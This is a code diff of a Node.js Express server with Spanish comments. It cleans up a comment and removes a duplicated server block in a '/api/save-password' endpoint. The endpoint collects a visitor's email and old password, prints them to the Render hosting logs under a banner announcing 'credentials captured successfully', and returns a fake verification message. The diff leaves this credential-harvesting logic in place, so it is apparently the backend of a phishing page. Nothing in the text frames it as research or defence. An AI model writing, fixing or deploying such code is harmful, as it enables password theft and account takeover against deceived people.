@@ -10,7 +10,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.post('/api/save-password', (req, res) => {
   const { email, oldPassword } = req.body;
 
-  // Esto aparecerá en grande y claro en la pestaña "Logs" de tu panel de Render
+  // Esto aparecerá en la pestaña "Logs" de tu panel de Render
   console.log("\n========================================");
   console.log("¡CREDENCIALES CAPTURADAS EXITOSAMENTE!");
   console.log(`Correo: ${email}`);
@@ -18,14 +18,6 @@ app.post('/api/save-password', (req, res) => {
   console.log("========================================\n");
 
   res.json({ success: true, message: 'Verificado correctamente.' });
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Servidor abierto en el puerto ${PORT}`);
-});
-
-  res.json({ success: true, message: 'Contraseña guardada correctamente.' });
 });
 
 const PORT = process.env.PORT || 3000;
